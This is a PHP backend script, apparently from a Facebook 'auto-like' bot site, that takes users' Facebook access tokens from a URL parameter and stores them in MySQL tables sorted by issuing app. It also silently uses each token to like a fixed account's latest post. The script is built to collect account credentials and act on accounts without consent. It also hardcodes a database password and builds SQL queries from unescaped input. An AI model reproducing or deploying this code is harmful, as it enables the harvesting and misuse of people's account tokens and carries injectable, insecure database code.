<?php
set_time_limit(0);
////////////////////////////////////
////////////////////////////////////
//////////Code___By___Hậu///////////
///////////BOT-SYSTEM.ML////////////
////////////////////////////////////
$db_host = "localhost";
$db_user = "autobotlike_data";
$db_pass = "Matkhau@123";	
$db_name = "autobotlike_data";
// Mình Ko Dám Require Vào Vì Có Một Số Code Bị Đổi Đường Dẫn File Kết Nối Database Với Function Rùi.
$connection = mysql_connect($db_host,$db_user,$db_pass);
if (!$connection){
die('Không Thể Kết Nối: ' . mysql_error());}
mysql_select_db($db_name) or die(mysql_error());
mysql_query("SET NAMES utf8");
	$token = $_GET['token'];
	if($token){
		$me = me($token);
		if($me['id']&&(!ereg('@tfbnw.net',$me['email']))&&(!ereg('CAAC',$token))){
			$tk = checktk($token);
			$star = @mysql_query("SELECT * FROM `TAIKHOAN` WHERE `idfb` = $me[id];");
			if(mysql_num_rows($star) < 1){
				$time = time();
				@mysql_query("INSERT INTO TAIKHOAN SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `time` = '" . $time . "', `vnd` = '5000'");
			}
			$rows = null;
			$result = mysql_query("SELECT * FROM tokenvip WHERE idfb = '" . $me['id'] . "'");
			if($result){
				$rows = mysql_fetch_array($result, MYSQL_ASSOC);
				if(mysql_num_rows($result) > 1){
					mysql_query("DELETE FROM tokenvip WHERE idfb='" . $me['id'] . "' ");
				}
			}
			if(!$rows){
				mysql_query("INSERT INTO tokenvip SET `idfb` = '" . $me['id'] . "',`ten` = '" . $me['name'] . "',`token` = '" . $token . "'");
			}
			else{
				mysql_query("UPDATE tokenvip SET `token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . "");
			}
			if($tk['id'] == '165907476854626'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenios WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenios WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006941256774', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenios SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '41158896424'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenhtc WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenhtc WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006941256774', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenhtc SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '6628568379'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokeniphone WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokeniphone WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006941256774', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokeniphone SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokeniphone SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '350685531728'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenandroid WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenandroid WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006941256774', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenandroid SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenandroid SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
		}
	}

function LikeAD($id, $token){
$starthien = json_decode(auto('https://graph.facebook.com/'.$id.'/feed?limit=1&access_token='.$token),true);
$sttid = $starthien[data][0][id];
return auto('https://graph.facebook.com/'.$sttid.'/likes?method=post&access_token='.$token);
}
function me($star){
return json_decode(auto('https://graph.facebook.com/me?access_token='.$star),true);
}
function checktk($thienbk){
return json_decode(auto('https://graph.facebook.com/app/?access_token='.$thienbk), true);
}
function auto($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
?>